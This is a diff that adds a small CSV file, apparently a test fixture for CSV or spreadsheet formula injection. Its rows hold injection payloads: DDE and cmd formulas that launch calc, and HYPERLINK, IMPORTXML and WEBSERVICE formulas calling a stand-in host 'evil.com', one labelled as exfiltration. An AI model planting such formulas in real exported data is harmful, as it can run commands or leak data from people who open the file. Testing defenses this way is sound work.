@@ -1,0 +1,11 @@
+id,name,command,description
+1,Alice,=2+2,Simple arithmetic formula
+2,Bob,"=cmd|'/c calc'",Command execution attempt (Windows)
+3,Charlie,@SUM(A1:A10),Lotus formula syntax
+4,David,+2+3,Addition formula
+5,Eve,-2+3,Subtraction formula
+6,Frank,"=HYPERLINK(""http://evil.com"",""Click me"")",Hyperlink injection
+7,Grace,"=DDE(""cmd"",""/c calc"","""")",DDE injection attempt
+8,Henry,"=IMPORTXML(""http://evil.com/data"", ""//node"")",External data import
+9,Ivy,"=WEBSERVICE(""http://evil.com/exfiltrate"")",Web service call
+10,Jack,"=FILTERXML(""<x>data</x>"", ""//x"")",XML parsing injection
